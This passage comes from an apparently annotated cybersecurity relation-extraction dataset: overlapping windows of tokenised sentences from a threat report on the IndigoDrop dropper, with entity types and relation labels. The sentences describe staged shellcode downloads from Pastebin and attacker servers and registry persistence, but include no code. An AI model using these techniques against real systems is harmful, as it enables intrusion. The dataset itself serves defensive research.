131], "name": "server", "pos": [11, 12], "index": "23_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 4, "t": 5}, {"r": "RF", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 10}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 4, "t": 13}, {"r": "EX", "evidence": [2], "h": 8, "t": 9}, {"r": "RD", "evidence": [3], "h": 10, "t": 11}, {"r": "CO", "evidence": [3], "h": 11, "t": 12}, {"r": "FR", "evidence": [4], "h": 13, "t": 15}, {"r": "EX", "evidence": [4], "t": 14, "h": 15}, {"r": "EX", "evidence": [4, 5], "t": 14, "h": 16}, {"r": "WR", "evidence": [5], "h": 16, "t": 17}, {"r": "EX", "evidence": [5], "h": 16, "t": 17}, {"r": "ST", "evidence": [5], "h": 16, "t": 18}, {"r": "RF", "evidence": [5], "h": 16, "t": 18}, {"r": "FR", "evidence": [6], "h": 19, "t": 21}, {"r": "EX", "evidence": [6], "t": 20, "h": 21}, {"r": "WR", "evidence": [6, 7], "h": 21, "t": 22}, {"r": "ST", "evidence": [6, 7], "h": 21, "t": 23}, {"r": "RF", "evidence": [6, 7], "h": 21, "t": 23}]}, {"title": "643-63", "sents": [["These", "droppers", "now", "connected", "to", "public", "IPs", "operated", "by", "the", "attackers", "to", "download", "the", "third-stage", "payloads", "."], ["These", "droppers", "were", "multi-staged", "where", ":", "The", "actual", "dropper", "was", "a", "malicious", "EXE", "file", "."], ["This", "dropper", "would", "extract", "an", "embedded", "DLL", "and", "drop", "it", "to", "disk", "."], ["The", "dropper", "then", "activates", "the", "DLL", "using", "rundll32.exe", "."], ["The", "DLL", "is", "responsible", "for", "downloading", "and", "executing", "the", "third-stage", "payload", "from", "an", "attacker", "operated", "server", "."], ["The", "DLL", "does", "this", "by", "executing", "minimal", "python", "code", "using", "the", "python27.dll", "library", "."], ["Instead", ",", "the", "shellcode", "was", "hosted", "on", "an", "attacker-controlled", "and", "operated", "server", "."], ["Python", "code", "executed", "by", "the", "Python", "library", "in", "the", "downloader", ":", "Decoded", "base64", "Python", "code", ":", "Oct.", "2019", ":", "//Pastebin", "usage", "begins", "hereThe", "attackers", "started", "using", "pastebin.com", "to", "host", "their", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "in", "October", "2019", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "droppers", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [6, 6], "name": "IPs", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "payloads", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "droppers", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "dropper", "pos": [8, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "EXE file", "pos": [12, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [33, 33], "name": "dropper", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [38, 38], "name": "DLL", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [41, 41], "name": "it", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [46, 46], "name": "dropper", "pos": [1, 2], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [50, 50], "name": "DLL", "pos": [5, 6], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [52, 52], "name": "rundll32.exe", "pos": [7, 8], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [55, 55], "name": "DLL", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [64, 64], "name": "payload", "pos": [10, 11], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [69, 69], "name": "server", "pos": [15, 16], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [72, 72], "name": "DLL", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [78, 78], "name": "python code", "pos": [7, 9], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [82, 82], "name": "python27.dll library", "pos": [11, 13], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [88, 88], "name": "shellcode", "pos": [3, 4], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [96, 96], "name": "server", "pos": [11, 12], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [98, 98], "name": "Python code", "pos": [0, 2], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [103, 103], "name": "Python library", "pos": [5, 7], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [111, 111], "name": "Python code", "pos": [13, 15], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [121, 121], "name": "attackers", "pos": [23, 24], "index": "23_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [124, 124], "name": "pastebin.com", "pos": [26, 27], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [130, 130], "name": "shellcode", "pos": [32, 33], "index": "25_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 9}, {"r": "EX", "evidence": [1], "h": 4, "t": 5}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "CO", "evidence": [2], "h": 7, "t": 8}, {"r": "FR", "evidence": [3], "h": 9, "t": 11}, {"r": "EX", "evidence": [3], "t": 10, "h": 11}, {"r": "EX", "evidence": [3, 4], "t": 10, "h": 12}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "EX", "evidence": [4], "h": 12, "t": 13}, {"r": "ST", "evidence": [4], "h": 12, "t": 14}, {"r": "RF", "evidence": [4], "h": 12, "t": 14}, {"r": "FR", "evidence": [5], "h": 15, "t": 17}, {"r": "EX", "evidence": [5], "t": 16, "h": 17}, {"r": "WR", "evidence": [5, 6], "h": 17, "t": 18}, {"r": "ST", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "RF", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "WR", "evidence": [6, 7], "t": 18, "h": 21}, {"r": "ST", "evidence": [6, 7], "t": 19, "h": 21}, {"r": "RF", "evidence": [6, 7], "t": 19, "h": 21}, {"r": "EX", "evidence": [7], "t": 20, "h": 21}, {"r": "WR", "evidence": [7], "h": 21, "t": 22}, {"r": "WR", "evidence": [7], "t": 22, "h": 23}, {"r": "ST", "evidence": [7], "h": 23, "t": 24}, {"r": "RF", "evidence": [7], "h": 23, "t": 24}, {"r": "RD", "evidence": [7], "h": 23, "t": 25}]}, {"title": "643-64", "sents": [["These", "droppers", "were", "multi-staged", "where", ":", "The", "actual", "dropper", "was", "a", "malicious", "EXE", "file", "."], ["This", "dropper", "would", "extract", "an", "embedded", "DLL", "and", "drop", "it", "to", "disk", "."], ["The", "dropper", "then", "activates", "the", "DLL", "using", "rundll32.exe", "."], ["The", "DLL", "is", "responsible", "for", "downloading", "and", "executing", "the", "third-stage", "payload", "from", "an", "attacker", "operated", "server", "."], ["The", "DLL", "does", "this", "by", "executing", "minimal", "python", "code", "using", "the", "python27.dll", "library", "."], ["Instead", ",", "the", "shellcode", "was", "hosted", "on", "an", "attacker-controlled", "and", "operated", "server", "."], ["Python", "code", "executed", "by", "the", "Python", "library", "in", "the", "downloader", ":", "Decoded", "base64", "Python", "code", ":", "Oct.", "2019", ":", "//Pastebin", "usage", "begins", "hereThe", "attackers", "started", "using", "pastebin.com", "to", "host", "their", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "in", "October", "2019", "."], ["The", "IndigoDrop", "samples", "built", "during", "this", "time", "period", "now", "also", "included", "the", "capabilities", "to", "persist", "another", "component", "of", "the", "infection", "(", "usually", "located", "at", "``", "%", "userprofile", "%", "\\AppData\\Local\\Microsoft\\svchost.exe", "''", ")", "via", "registry", "and", "the", "Windows", "Startup", "folder", ":", "IndigoDrop", "downloading", "the", "MSF", "shellcode", "from", "Pastebin", ":", "Late", "October", "2019", "-", "Present", ":", "Multiple", "Pastebins", "and", "anti-Infection", "checksHaving", "realized", "the", "utility", "of", "Pastebin", ",", "the", "attackers", "upgraded", "their", "IndigoDrop", "implementations", "to", "use", "multiple", "Pastebins", "to", "downlo"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "droppers", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "dropper", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "EXE file", "pos": [12, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "dropper", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "DLL", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "it", "pos": [9, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [29, 29], "name": "dropper", "pos": [1, 2], "index": "6_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [33, 33], "name": "DLL", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [35, 35], "name": "rundll32.exe", "pos": [7, 8], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [38, 38], "name": "DLL", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [47, 47], "name": "payload", "pos": [10, 11], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [52, 52], "name": "server", "pos": [15, 16], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [55, 55], "name": "DLL", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [61, 61], "name": "python code", "pos": [7, 9], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [65, 65], "name": "python27.dll library", "pos": [11, 13], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [71, 71], "name": "shellcode", "pos": [3, 4], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [79, 79], "name": "server", "pos": [11, 12], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [81, 81], "name": "Python code", "pos": [0, 2], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [86, 86], "name": "Python library", "pos": [5, 7], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [94, 94], "name": "Python code", "pos": [13, 15], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [104, 104], "name": "attackers", "pos": [23, 24], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [107, 107], "name": "pastebin.com", "pos": [26, 27], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [113, 113], "name": "shellcode", "pos": [32, 33], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [123, 123], "name": "IndigoDrop", "pos": [1, 2], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [134, 134], "name": "capabilities", "pos": [12, 13], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [141, 141], "name": "infection", "pos": [19, 20], "index": "25_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [154, 154], "name": "registry", "pos": [32, 33], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [161, 161], "name": "IndigoDrop", "pos": [39, 40], "index": "27_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [165, 165], "name": "shellcode", "pos": [43, 44], "index": "28_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [187, 187], "name": "attackers", "pos": [65, 66], "index": "29_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [190, 190], "name": "IndigoDrop implementations", "pos": [68, 70], "index": "30_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [2], "h": 6, "t": 8}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "EX", "evidence": [2, 3], "t": 7, "h": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "EX", "evidence": [3], "h": 9, "t": 10}, {"r": "ST", "evidence": [3], "h": 9, "t": 11}, {"r": "RF", "evidence": [3], "h": 9, "t": 11}, {"r": "FR", "evidence": [4], "h": 12, "t": 14}, {"r": "EX", "evidence": [4], "t": 13, "h": 14}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 15}, {"r": "ST", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "RF", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "WR", "evidence": [5, 6], "t": 15, "h": 18}, {"r": "ST", "evidence": [5, 6], "t": 16, "h": 18}, {"r": "RF", "evidence": [5, 6], "t": 16, "h": 18}, {"r": "EX", "evidence": [6], "t": 17, "h": 18}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "t": 19, "h": 20}, {"r": "ST", "evidence": [6], "h": 20, "t": 21}, {"r": "RF", "evidence": [6], "h": 20, "t": 21}, {"r": "RD", "evidence": [6], "h": 20, "t": 22}, {"r": "RD", "evidence": [7], "h": 23, "t": 26}, {"r": "WR", "evidence": [7], "h": 24, "t": 26}, {"r": "RD", "evidence": [6, 7], "t": 22, "h": 25}, {"r": "RD", "evidence": [7], "h": 25, "t": 26}, {"r": "RD", "evidence": [7], "h": 25, "t": 26}, {"r": "WR", "evidence": [7], "h": 25, "t": 26}, {"r": "WR", "evidence": [7], "h": 27, "t": 28}, {"r": "WR", "evidence": [7], "h": 29, "t": 30}, {"r": "CO", "evidence": [7], "h": 23, "t": 24}]}, {"title": "643-65", "sents": [["This", "dropper", "would", "extract", "an", "embedded", "DLL", "and", "drop", "it", "to", "disk", "."], ["The", "dropper", "then", "activates", "the", "DLL", "using", "rundll32.exe", "."], ["The", "DLL", "is", "responsible", "for", "downloading", "and", "executing", "the", "third-stage", "payload", "from", "an", "attacker", "operated", "server", "."], ["The", "DLL", "does", "this", "by", "executing", "minimal", "python", "code", "using", "the", "python27.dll", "library", "."], ["Instead", ",", "the", "shellcode", "was", "hosted", "on", "an", "attacker-controlled", "and", "operated", "server", "."], ["Python", "code", "executed", "by", "the", "Python", "library", "in", "the", "downloader", ":", "Decoded", "base64", "Python", "code", ":", "Oct.", "2019", ":", "//Pastebin", "usage", "begins", "hereThe", "attackers", "started", "using", "pastebin.com", "to", "host", "their", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "in", "October", "2019", "."], ["The", "IndigoDrop", "samples", "built", "during", "this", "time", "period", "now", "also", "included", "the", "capabilities", "to", "persist", "another", "component", "of", "the", "infection", "(", "usually", "located", "at", "``", "%", "userprofile", "%", "\\AppData\\Local\\Microsoft\\svchost.exe", "''", ")", "via", "registry", "and", "the", "Windows", "Startup", "folder", ":", "IndigoDrop", "downloading", "the", "MSF", "shellcode", "from", "Pastebin", ":", "Late", "October", "2019", "-", "Present", ":", "Multiple", "Pastebins", "and", "anti-Infection", "checksHaving", "realized", "the", "utility", "of", "Pastebin", ",", "the", "attackers", "upgraded", "their", "IndigoDrop", "implementations", "to", "use", "multiple", "Pastebins", "to", "downlo"], ["The", "attackers", "used", "a", "combination", "of", "Pastebins", "and", "attacker-operated", "download", "servers", ",", "as", "backups", "if", "the", "pastes", "were", "removed", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "dropper", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "DLL", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "it", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [14, 14], "name": "dropper", "pos": [1, 2], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [18, 18], "name": "DLL", "pos": [5, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "rundll32.exe", "pos": [7, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [23, 23], "name": "DLL", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [32, 32], "name": "payload", "pos": [10, 11], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [37, 37], "name": "server", "pos": [15, 16], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [40, 40], "name": "DLL", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [46, 46], "name": "python code", "pos": [7, 9], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [50, 50], "name": "python27.dll library", "pos": [11, 13], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [56, 56], "name": "shellcode", "pos": [3, 4], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [64, 64], "name": "server", "pos": [11, 12], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [66, 66], "name": "Python code", "pos": [0, 2], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [71, 71], "name": "Python library", "pos": [5, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [79, 79], "name": "Python code", "pos": [13, 15], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [89, 89], "name": "attackers", "pos": [23, 24], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [92, 92], "name": "pastebin.com", "pos": [26, 27], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [98, 98], "name": "shellcode", "pos": [32, 33], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [108, 108], "name": "IndigoDrop", "pos": [1, 2], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [119, 119], "name": "capabilities", "pos": [12, 13], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [126, 126], "name": "infection", "pos": [19, 20], "index": "22_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [139, 139], "name": "registry", "pos": [32, 33], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [146, 146], "name": "IndigoDrop", "pos": [39, 40], "index": "24_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [150, 150], "name": "shellcode", "pos": [43, 44], "index": "25_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [172, 172], "name": "attackers", "pos": [65, 66], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [175, 175], "name": "IndigoDrop implementations", "pos": [68, 70], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [184, 184], "name": "attackers", "pos": [1, 2], "index": "28_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [193, 193], "name": "servers", "pos": [10, 11], "index": "29_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "h": 3, "t": 5}, {"r": "EX", "evidence": [1], "t": 4, "h": 5}, {"r": "EX", "evidence": [1, 2], "t": 4, "h": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "FR", "evidence": [3], "h": 9, "t": 11}, {"r": "EX", "evidence": [3], "t": 10, "h": 11}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 12}, {"r": "ST", "evidence": [3, 4], "h": 11, "t": 13}, {"r": "RF", "evidence": [3, 4], "h": 11, "t": 13}, {"r": "WR", "evidence": [4, 5], "t": 12, "h": 15}, {"r": "ST", "evidence": [4, 5], "t": 13, "h": 15}, {"r": "RF", "evidence": [4, 5], "t": 13, "h": 15}, {"r": "EX", "evidence": [5], "t": 14, "h": 15}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "t": 16, "h": 17}, {"r": "ST", "evidence": [5], "h": 17, "t": 18}, {"r": "RF", "evidence": [5], "h": 17, "t": 18}, {"r": "RD", "evidence": [5], "h": 17, "t": 19}, {"r": "RD", "evidence": [6], "h": 20, "t": 23}, {"r": "WR", "evidence": [6], "h": 21, "t": 23}, {"r": "RD", "evidence": [5, 6], "t": 19, "h": 22}, {"r": "RD", "evidence": [6], "h": 22, "t": 23}, {"r": "RD", "evidence": [6], "h": 22, "t": 23}, {"r": "WR", "evidence": [6], "h": 22, "t": 23}, {"r": "WR", "evidence": [6], "h": 24, "t": 25}, {"r": "WR", "evidence": [6], "h": 26, "t": 27}, {"r": "CO", "evidence": [6], "h": 20, "t": 21}, {"r": "CO", "evidence": [6, 7], "h": 26, "t": 28}, {"r": "ST", "evidence": [7], "h": 28, "t": 29}, {"r": "RF", "evidence": [7], "h": 28, "t": 29}]}, {"title": "643-66", "sents": [["The", "dropper", "then", "activates", "the", "DLL", "using", "rundll32.exe", "."], ["The", "DLL", "is", "responsible", "for", "downloading", "and", "executing", "the", "third-stage", "payload", "from", "an", "attacker", "operated", "server", "."], ["The", "DLL", "does", "this", "by", "executing", "minimal", "python", "code", "using", "the", "python27.dll", "library", "."], ["Instead", ",", "the", "shellcode", "was", "hosted", "on", "an", "attacker-controlled", "and", "operated", "server", "."], ["Python", "code", "executed", "by", "the", "Python", "library", "in", "the", "downloader", ":", "Decoded", "base64", "Python", "code", ":", "Oct.", "2019", ":", "//Pastebin", "usage", "begins", "hereThe", "attackers", "started", "using", "pastebin.com", "to", "host", "their", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "in", "October", "2019", "."], ["The", "IndigoDrop", "samples", "built", "during", "this", "time", "period", "now", "also", "included", "the", "capabilities", "to", "persist", "another", "component", "of", "the", "infection", "(", "usually", "located", "at", "``", "%", "userprofile", "%", "\\AppData\\Local\\Microsoft\\svchost.exe", "''", ")", "via", "registry", "and", "the", "Windows", "Startup", "folder", ":", "IndigoDrop", "downloading", "the", "MSF", "shellcode", "from", "Pastebin", ":", "Late", "October", "2019", "-", "Present", ":", "Multiple", "Pastebins", "and", "anti-Infection", "checksHaving", "realized", "the", "utility", "of", "Pastebin", ",", "the", "attackers", "upgraded", "their", "IndigoDrop", "implementations", "to", "use", "multiple", "Pastebins", "to", "downlo"], ["The", "attackers", "used", "a", "combination", "of", "Pastebins", "and", "attacker-operated", "download", "servers", ",", "as", "backups", "if", "the", "pastes", "were", "removed", "."], ["Base64-encoded", "Pastebin", "and", "attacker-downloaded", "URL", "in", "an", "IndigoDrop", "sample", ":", "The", "evolution", "of", "attacks", "is", "illustrated", "here", ":", "ConclusionThis", "investigation", "illustrates", "an", "attacker", "using", "multiple", "tools", "and", "techniques", "to", "implement", "their", "full", "attack", "chain", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "dropper", "pos": [1, 2], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [5, 5], "name": "DLL", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "rundll32.exe", "pos": [7, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [10, 10], "name": "DLL", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "payload", "pos": [10, 11], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [24, 24], "name": "server", "pos": [15, 16], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [27, 27], "name": "DLL", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [33, 33], "name": "python code", "pos": [7, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "python27.dll library", "pos": [11, 13], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [43, 43], "name": "shellcode", "pos": [3, 4], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [51, 51], "name": "server", "pos": [11, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [53, 53], "name": "Python code", "pos": [0, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [58, 58], "name": "Python library", "pos": [5, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [66, 66], "name": "Python code", "pos": [13, 15], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [76, 76], "name": "attackers", "pos": [23, 24], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [79, 79], "name": "pastebin.com", "pos": [26, 27], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "shellcode", "pos": [32, 33], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [95, 95], "name": "IndigoDrop", "pos": [1, 2], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "capabilities", "pos": [12, 13], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [113, 113], "name": "infection", "pos": [19, 20], "index": "19_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [126, 126], "name": "registry", "pos": [32, 33], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [133, 133], "name": "IndigoDrop", "pos": [39, 40], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [137, 137], "name": "shellcode", "pos": [43, 44], "index": "22_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [159, 159], "name": "attackers", "pos": [65, 66], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "IndigoDrop implementations", "pos": [68, 70], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [171, 171], "name": "attackers", "pos": [1, 2], "index": "25_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [180, 180], "name": "servers", "pos": [10, 11], "index": "26_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [194, 194], "name": "URL", "pos": [4, 5], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [197, 197], "name": "IndigoDrop", "pos": [7, 8], "index": "28_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [203, 203], "name": "attacks", "pos": [13, 14], "index": "29_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [215, 215], "name": "tools", "pos": [25, 26], "index": "30_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "FR", "evidence": [2], "h": 6, "t": 8}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "ST", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "RF", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "WR", "evidence": [3, 4], "t": 9, "h": 12}, {"r": "ST", "evidence": [3, 4], "t": 10, "h": 12}, {"r": "RF", "evidence": [3, 4], "t": 10, "h": 12}, {"r": "EX", "evidence": [4], "t": 11, "h": 12}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "WR", "evidence": [4], "t": 13, "h": 14}, {"r": "ST", "evidence": [4], "h": 14, "t": 15}, {"r": "RF", "evidence": [4], "h": 14, "t": 15}, {"r": "RD", "evidence": [4], "h": 14, "t": 16}, {"r": "RD", "evidence": [5], "h": 17, "t": 20}, {"r": "WR", "evidence": [5], "h": 18, "t": 20}, {"r": "RD", "evidence": [4, 5], "t": 16, "h": 19}, {"r": "RD", "evidence": [5], "h": 19, "t": 20}, {"r": "RD", "evidence": [5], "h": 19, "t": 20}, {"r": "WR", "evidence": [5], "h": 19, "t": 20}, {"r": "WR", "evidence": [5], "h": 21, "t": 22}, {"r": "WR", "evidence": [5], "h": 23, "t": 24}, {"r": "CO", "evidence": [5], "h": 17, "t": 18}, {"r": "CO", "evidence": [5, 6], "h": 23, "t": 25}, {"r": "ST", "evidence": [6], "h": 25, "t": 26}, {"r": "RF", "evidence": [6], "h": 25, "t": 26}, {"r": "RD", "evidence": [7], "t": 27, "h": 28}, {"r": "FR", "evidence": [7], "h": 29, "t": 30}]}, {"title": "643-67", "sents": [["The", "DLL", "is", "responsible", "for", "downloading", "and", "executing", "the", "third-stage", "payload", "from", "an", 